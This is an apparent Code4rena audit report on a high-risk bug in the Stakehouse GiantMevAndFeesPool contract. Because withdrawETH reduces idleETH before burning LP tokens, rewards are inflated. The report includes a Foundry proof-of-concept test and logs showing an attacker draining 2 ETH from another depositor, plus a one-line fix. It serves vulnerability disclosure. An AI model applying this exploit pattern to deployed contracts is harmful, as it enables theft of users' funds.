## Tags

- bug
- 3 (High Risk)
- primary issue
- selected for report
- sponsor confirmed
- edited-by-warden
- H-08

# [function withdrawETH from GiantMevAndFeesPool can steal most of eth because of idleETH is reduced before burning token](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/129) 

# Lines of code

https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantPoolBase.sol#L57-L60
https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178
https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L76-L90


# Vulnerability details

## Impact

The contract GiantMevAndFeesPool override the function totalRewardsReceived:
```
return address(this).balance + totalClaimed - idleETH;
```
The function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the function `SyndicateRewardsProcessor._updateAccumulatedETHPerLP`
```
uint256 received = totalRewardsReceived();
uint256 unprocessed = received - totalETHSeen;
```
But it will decrease the `idleETH` first and then burn the lpTokenETH in the function `GiantMevAndFeesPool.withdrawETH`. The lpTokenETH burn option will trigger `GiantMevAndFeesPool.beforeTokenTransfer` which will call _updateAccumulatedETHPerLP and send the accumulated rewards to the msg sender. Because of the diminution of the idleETH, the `accumulatedETHPerLPShare` is added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.

## Proof of Concept
I wrote a test file for proof, but there is another bug/vulnerability which will make the `GiantMevAndFeesPool.withdrawETH` function break down. I submitted it as the other finding named "GiantLP with a transferHookProcessor cant be burned, users' funds will be stuck in the Giant Pool". You should fix it first by modifying the code https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L161-L166 to :
```
if (_to != address(0)) {
    _distributeETHRewardsToUserForToken(
        _to,
        address(lpTokenETH),
        lpTokenETH.balanceOf(_to),
        _to
    );
}
```
I know modifying the project source code is controversial. Please believe me it's a bug needed to be fixed and it's independent of the current vulnerability.

test:
test/foundry/TakeFromGiantPools2.t.sol
```
pragma solidity ^0.8.13;

// SPDX-License-Identifier: MIT

import "forge-std/console.sol";
import {GiantPoolTests} from "./GiantPools.t.sol";

contract TakeFromGiantPools2 is GiantPoolTests {
    function testDWUpdateRate2() public{
        address feesAndMevUserOne = accountOne; vm.deal(feesAndMevUserOne, 4 ether);
        address feesAndMevUserTwo = accountTwo; vm.deal(feesAndMevUserTwo, 4 ether);
        // Deposit ETH into giant fees and mev
        vm.startPrank(feesAndMevUserOne);
        giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);
        vm.stopPrank();
        vm.startPrank(feesAndMevUserTwo);
        giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);
        giantFeesAndMevPool.withdrawETH(4 ether);
        vm.stopPrank();
        console.log("user one:", getBalance(feesAndMevUserOne));
        console.log("user two(attacker):", getBalance(feesAndMevUserTwo));
        console.log("giantFeesAndMevPool:", getBalance(address(giantFeesAndMevPool)));
    }

    function getBalance(address addr) internal returns (uint){
        // just ETH
        return addr.balance;  // + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);
    }

}
```
run test:
```
forge test --match-test testDWUpdateRate2 -vvv
```

test log:
```
Logs:
  user one: 0
  user two(attacker): 6000000000000000000
  giantFeesAndMevPool: 2000000000000000000
```

The attacker stole 2 eth from the pool.

## Tools Used
foundry

## Recommended Mitigation Steps
`idleETH -= _amount;` should be after the `lpTokenETH.burn`.